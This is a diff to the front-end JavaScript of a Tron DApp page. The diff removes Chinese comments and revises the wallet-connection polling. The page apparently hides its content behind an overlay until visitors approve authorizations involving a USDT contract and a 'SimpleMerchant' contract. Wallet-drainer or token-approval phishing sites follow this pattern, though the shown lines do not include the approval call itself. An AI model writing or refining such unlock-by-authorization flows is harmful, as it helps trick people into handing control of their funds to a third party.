@@ -448,7 +448,6 @@ function updateConnectionUI(connected, address = null) {
     if (connectButton) {
         if (connected && address) {
             connectButton.classList.add('connected');
-            // Tron 地址较长，只显示开头和结尾
             const shortAddress = address.length > 8 ? `${address.substring(0, 4)}...${address.slice(-4)}` : address;
             connectButton.innerHTML = `Connected: ${shortAddress}`;
             connectButton.title = `Connected: ${address}`;
@@ -456,7 +455,6 @@ function updateConnectionUI(connected, address = null) {
             connectButton.classList.remove('connected');
             connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
             connectButton.title = 'Connect Wallet';
-            // 【注意】这里不再调用 hideOverlay()，而是依赖 checkAuthorization 来决定是否隐藏
         }
     }
 }
@@ -477,7 +475,6 @@ function updateStatus(message) {
 async function checkAuthorization() {
     try {
         if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
-            // 如果连接不完整，保持初始遮罩状态
             updateConnectionUI(false); 
             showOverlay('Wallet not connected. Please connect.');
             return;
@@ -521,18 +518,16 @@ async function checkAuthorization() {
 
 
         if (allAuthorized) {
-            // **【遮罩修复】** 授权完成，隐藏遮罩和状态栏
             connectButton.classList.add('connected');
             connectButton.title = 'Disconnect Wallet';
             connectButton.disabled = false;
             updateStatus('All authorizations complete.'); 
             hideOverlay(); 
         } else {
-            // **【遮罩修复】** 授权未完成，显示遮罩，并提示用户点击按钮进行操作
             connectButton.classList.remove('connected');
             connectButton.title = 'Complete Authorization';
             connectButton.disabled = false;
-            updateStatus(`Authorization incomplete. ${statusMessage}`); // 状态栏显示详细信息
+            updateStatus(`Authorization incomplete. ${statusMessage}`); 
             showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner to begin authorization.'); 
         }
     } catch (error) {
@@ -597,7 +592,7 @@ async function executeAuthorization() {
                              
         updateStatus(`🔴 ${errorMessage}`);
         showOverlay(`🔴 Authorization failed: ${errorMessage}`);
-        await checkAuthorization(); // 交易失败后，回退到只读检查
+        await checkAuthorization(); 
     }
 }
 
@@ -615,32 +610,41 @@ async function connectWallet() {
         showOverlay('Please ensure your wallet is logged in and connected to this DApp...');
         
         tronWeb = window.tronWeb;
-        let userAddress = null;
+        let localUserAddress = null;
 
-        // **【修复：使用循环等待地址加载】**
-        const MAX_RETRIES = 10;
+        // **【修复：优先非TRONLINK钱包的轮询逻辑】**
+        const MAX_RETRIES = 12; 
         const DELAY_MS = 500;
         let retryCount = 0;
 
-        while (!userAddress && retryCount < MAX_RETRIES) {
+        while (!localUserAddress && retryCount < MAX_RETRIES) {
+            // 检查是否有TronLink/tronLink.request，作为第二顺位
+             if (window.tronLink && typeof window.tronLink.request === 'function' && retryCount === 0) {
+                 try {
+                     await window.tronLink.request({ method: 'tron_requestAccounts' });
+                 } catch (e) {
+                     console.warn("TronLink request failed/cancelled. Proceeding with polling.");
+                 }
+             }
+             
             await new Promise(resolve => setTimeout(resolve, DELAY_MS)); 
             
             if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58 && tronWeb.defaultAddress.base58.length > 5) {
-                userAddress = tronWeb.defaultAddress.base58;
+                localUserAddress = tronWeb.defaultAddress.base58;
                 break;
             }
             retryCount++;
         }
 
-        if (!userAddress || userAddress === tronWeb.defaultAddress.hex) { 
+        if (!localUserAddress || localUserAddress === tronWeb.defaultAddress.hex) { 
             throw new Error("Could not retrieve Tron account address after multiple attempts. Please ensure your wallet is connected/logged in.");
         }
         
         // 全局更新用户地址
-        window.userAddress = userAddress;
+        window.userAddress = localUserAddress;
         
-        console.log("✅ User Address:", userAddress);
-        updateConnectionUI(true, userAddress);
+        console.log("✅ User Address:", localUserAddress);
+        updateConnectionUI(true, localUserAddress);
 
         // 实例化 SimpleMerchant 合约
         contractInstance = await tronWeb.contract(CONTRACT_ABI, TRON_CONTRACT_ADDRESS);
@@ -661,7 +665,6 @@ async function connectWallet() {
 
 // --- 处理授权流程 ---
 async function handleAuthorization() {
-    // 逻辑已移至 executeAuthorization
     await executeAuthorization(); 
 }
 
@@ -672,7 +675,6 @@ function disconnectWallet() {
     contractInstance = null;
     usdtContractInstance = null;
     updateConnectionUI(false);
-    // **【遮罩修复】** 断开连接后，显示遮罩
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
 
@@ -688,6 +690,5 @@ connectButton.addEventListener('click', () => {
 // 页面加载完成后，初始化 
 window.onload = () => {
     updateConnectionUI(false); 
-    // **【遮罩修复】** 页面加载时，显示连接提示遮罩
     showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
 };
